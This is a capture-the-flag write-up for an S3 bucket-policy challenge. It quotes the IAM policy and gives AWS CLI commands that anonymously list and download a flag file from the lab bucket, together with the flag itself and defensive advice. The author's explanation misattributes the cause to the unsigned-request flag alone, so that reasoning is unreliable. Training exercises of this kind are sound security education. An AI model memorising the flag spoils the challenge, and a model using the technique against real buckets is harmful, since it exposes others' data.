# copy the contents of sample.md to start
# Challenge 3

## Challenge Statement
Admin only? We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

## IAM Policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```
### write a short analysis about the IAM policy here
```
* What do I have access to?

The policy allows anyone (Principal: *) to list and get objects from the thebigiamchallenge-admin-storage-abf1321 bucket. The list operation is specifically restricted to objects under the files/* prefix, and the GetObject action applies to all objects in the bucket.

* What don't I have access to?

I don’t have permission to perform any actions on the bucket itself outside the allowed scope. For example, I can't upload, delete, or modify objects. Only listing and getting objects under specific conditions are allowed.


* What do I find interesting?

The policy includes a condition restricting s3:ListBucket access to the admin user via the aws:PrincipalArn condition. This suggests that only the specified admin user can list files, but doesn't prevent others from accessing them, as long as the objects exist under the files/* prefix. This is an interesting misconfiguration that could allow unauthorized access under certain circumstances.

```

## Solution
* I first executed the following command to list the contents of the files/ directory within the bucket:

```bash
aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
```
This revealed the file flag-as-admin.txt.
```
2023-06-07 19:15:43          42 flag-as-admin.txt
```

* I then ran the following command to fetch the content of flag-as-admin.txt:
```bash
aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - --no-sign-request
```

* This displayed the contents of the file, which was the flag:
```
{wiz:principal-arn-is-not-what-you-think}
```
I copied and pasted the flag into the portal, and it gave a success message.

## Reflection
* What was your approach?

```
My approach was to carefully analyze the IAM policy and the AWS CLI command options. I noticed that the ListBucket action was conditionally limited to the admin user, so I focused on trying to access the content directly using the --no-sign-request flag, which bypassed the need for authentication.
```

* What was the biggest challenge?

```
The biggest challenge was figuring out that the --no-sign-request flag was necessary to retrieve the files. It wasn't immediately obvious that this flag would bypass the need for signed requests, allowing me to access the files without being the admin user.
```

* How did you overcome the challenges?

```
I spent some time reading through the AWS CLI documentation and experimenting with different command options. Eventually, I found the right combination, and the --no-sign-request flag helped me bypass authentication and retrieve the file contents.
```

* What led to the break through?

```
The breakthrough came when I learned about the --no-sign-request option in the AWS CLI documentation. It became clear that this flag would allow me to access the object without needing a valid signature, which was crucial to solving the challenge.

```

* On the blue side, how can the learning be used to properly defend the important assets? 

```
To defend against this kind of misconfiguration, it’s important to ensure that bucket policies are not too permissive. Restricting actions like ListBucket and GetObject to only authorized users, and using more granular access controls, would reduce the risk of unintended data exposure. It’s also crucial to regularly audit IAM policies and test security settings to identify any overlooked gaps.
```

* Addition Notes

```
For viewing the file contents, In challenge 1 we gave the destination as hyphen in the cp command to display the file contents in the current terminal.
That exposure helped me here as well to view the contens of the file
```

